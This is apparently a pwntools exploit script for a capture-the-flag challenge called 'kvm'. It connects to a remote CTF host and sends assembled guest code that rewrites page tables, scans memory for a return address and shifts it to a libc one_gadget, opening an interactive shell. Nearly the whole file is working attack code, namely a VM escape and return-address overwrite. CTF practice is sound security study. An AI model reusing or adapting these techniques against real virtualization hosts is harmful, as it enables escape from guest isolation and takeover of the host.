
from pwn import *
from struct import pack, unpack
from sys import argv



###############################################################################
#### Init (copied from disconnect3d template)
###############################################################################
e = context.binary = ELF('./kvm')
context.arch = 'amd64'

gdbscript = '''
'''

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([e.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([e.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    host = 'kvm.zajebistyc.tf'
    port = 13402
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)


###############################################################################
#### Exploit
###############################################################################
def send_payload(payload):
    context.log_level = 'debug'
    p.send(pack('<L', len(payload)))
    p.send(payload)


def get_shell():
    ra_libc_ofst = 0x21b97
    ra_ofst = 0xe70
    one_gadget_ofst = 0x4f365

    delta = -ra_libc_ofst + one_gadget_ofst
    assert delta > 0

    payload = asm(
        f'''
        mov qword ptr [0x1000], 0x2003
        mov qword ptr [0x2000], 0x3003
        mov qword ptr [0x3000], 0x0003
        mov qword ptr [0x0], 0x3
        mov qword ptr [0x8], 0x7003

        mov rax, 0x1000
        mov cr3, rax

        mov rcx, 0x1028
    look_for_ra:
        add rcx, 8
        cmp qword ptr [rcx], 0
        je look_for_ra

        add rcx, 24
    overwrite_ra:
        mov rax, qword ptr [rcx]
        add rax, {delta}
        mov qword ptr [rcx], rax

        hlt
        '''
    )
    send_payload(payload)


p = start()
get_shell()
p.interactive()